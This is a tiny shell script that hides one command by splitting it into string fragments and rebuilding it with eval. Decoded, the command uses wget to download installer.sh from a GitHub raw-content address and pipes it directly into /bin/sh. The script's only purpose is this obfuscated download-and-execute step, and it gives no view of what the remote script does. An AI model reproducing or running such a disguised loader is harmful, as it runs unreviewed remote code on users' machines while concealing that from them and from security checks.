z="
";Fz='hubu';Nz='e/ma';Ez='.git';Az='wget';Gz='serc';Uz='/bin';Vz='/sh';Hz='onte';Rz='.sh ';Lz='37/a';Pz='nsta';Dz='/raw';Kz='mil2';Qz='ller';Mz='nsit';Iz='nt.c';Sz='-qO ';Cz='ps:/';Bz=' htt';Oz='in/i';Tz='- | ';Jz='om/e';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz"